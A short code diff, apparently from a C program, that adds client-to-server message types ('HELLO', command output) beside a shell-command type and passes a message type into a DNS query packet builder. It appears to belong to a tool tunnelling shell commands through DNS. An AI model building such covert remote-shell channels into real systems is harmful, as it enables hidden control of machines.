@@ -13,6 +13,10 @@
 #define MESSAGE_TYPE_NO_CMD 	 	 0
 #define MESSAGE_TYPE_SHELL_CMD       1
 
+// client to server CONTROl info
+#define MESSAGE_TYPE_HELLO	 		 0x50
+#define MESSAGE_TYPE_CMD_OUTPUT		 0x51
+
 //#define HOST
 
 // globals
@@ -40,7 +44,8 @@ struct CONTROL
 
 // function definitions
 
-unsigned char *createDnsQueryPacket(unsigned char *host,
+unsigned char *createDnsQueryPacket(unsigned char _msgType,
+									  unsigned char *host,
 										unsigned char *_domain,
 											int *_sendLen);
 
